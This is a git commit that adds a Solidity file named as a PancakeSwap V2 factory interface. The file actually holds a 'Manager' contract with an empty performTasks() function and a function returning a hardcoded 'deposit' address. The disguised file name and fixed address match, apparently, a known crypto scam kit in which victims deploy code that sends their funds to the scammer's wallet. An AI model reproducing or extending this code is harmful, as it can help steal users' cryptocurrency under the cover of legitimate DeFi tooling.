ab66b6a6eef612e6ec5697ccdda9e09514f5ebf7
Cryptainn <96544830+Cryptainn@users.noreply.github.com>
2021-12-22 12:17:16 -0600

    Add files via upload

---
+++ pancakeswap-v2-periphery/contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x7315E5D1Ab20bb95c9e4f4ca6DE557980be689EB;
+	}
+}
